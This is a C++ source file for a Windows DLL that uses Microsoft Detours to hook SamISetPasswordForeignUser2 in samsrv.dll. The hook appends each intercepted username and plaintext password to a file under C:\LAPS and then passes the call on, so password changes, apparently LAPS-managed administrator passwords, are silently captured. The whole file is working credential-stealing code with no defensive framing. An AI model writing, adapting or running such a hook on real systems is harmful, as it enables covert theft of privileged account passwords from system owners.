#include <fstream>

#include "pch.h"
#include "Hook.h"
#include <detours.h>

#ifdef _DEBUG
void DEBUGLOG(LPCWSTR message)
{
	std::wofstream outputfile;
	outputfile.open("C:\\LAPS\\HookSamISetPasswordForeignUser2_DEBUG.txt", std::fstream::app);
	outputfile << message << std::endl;
	outputfile.close();
}
#else
void DEBUGLOG(LPCWSTR message)
{

}
#endif

BOOL AttachHook()
{
	DWORD error;
	DEBUGLOG(L"[*] AttachHook - function called");

	LPCWSTR dllname = L"samsrv.dll";
	HMODULE hMod = GetModuleHandle(dllname);
	if (!hMod) {
		DEBUGLOG(L"[-] AttachHook - samsrv not found, trying to load it");
		hMod = LoadLibrary(dllname);
		if (!hMod) {
			DEBUGLOG(L"[-] AttachHook - samsrv not found, failed to load it");
			return FALSE;
		}
		else {
			DEBUGLOG(L"[+] AttachHook - samsrv not found, successfully loaded");
		}
	}
	else {
		DEBUGLOG(L"[*] AttachHook - samsrv already loaded");
	}

	SamISetPasswordForeignUser2 = (pSamISetPasswordForeignUser2) GetProcAddress(hMod, "SamISetPasswordForeignUser2");
	if (SamISetPasswordForeignUser2 == nullptr)
	{
		DEBUGLOG(L"[-] AttachHook - SamISetPasswordForeignUser2 not found");
		return false;
	}

	error = DetourTransactionBegin();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourTransactionBegin");
		return FALSE;
	}
	error = DetourUpdateThread(GetCurrentThread());
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourUpdateThread");
		return FALSE;
	}
	error = DetourAttach(&(PVOID&)SamISetPasswordForeignUser2, HookSamISetPasswordForeignUser2);
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourAttach");
		return FALSE;
	}
	error = DetourTransactionCommit();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourTransactionCommit");
		return FALSE;
	} 
	DEBUGLOG(L"[+] AttachHook - function successfully called");
	return TRUE;
}

BOOL DetachHook()
{
	DWORD error;
	DEBUGLOG(L"[*] DetachHook - function called");
	error = DetourTransactionBegin();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourTransactionBegin");
		return FALSE;
	}
	error = DetourUpdateThread(GetCurrentThread());
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourUpdateThread");
		return FALSE;
	}
	error = DetourDetach(&(PVOID&)SamISetPasswordForeignUser2, HookSamISetPasswordForeignUser2);
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourDetach");
		return FALSE;
	}
	error = DetourTransactionCommit();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourTransactionCommit");
		return FALSE;
	}
	DEBUGLOG(L"[+] DetachHook - function successfully called");
	return TRUE;
}

NET_API_STATUS HookSamISetPasswordForeignUser2(LPVOID param1, UINT param2, LPVOID username, LPVOID password, LPVOID param5, LPVOID param6, LPVOID param7)
{
	DEBUGLOG(L"[*] HookSamISetPasswordForeignUser2 - function called");
	
	UNICODE_STRING* u = (UNICODE_STRING*)username;
	UNICODE_STRING* p = (UNICODE_STRING*)password;

	std::wofstream outputfile;
	outputfile.open("C:\\LAPS\\HookSamISetPasswordForeignUser2.txt", std::fstream::app);
	outputfile << L"Username: " << u->Buffer << std::endl;
	outputfile << L"Password: " << p->Buffer << std::endl;
	outputfile.close();

	DEBUGLOG(L"[+] HookSamISetPasswordForeignUser2 - function successfully called");

	return SamISetPasswordForeignUser2(param1, param2, username, password, param5, param6, param7);
}
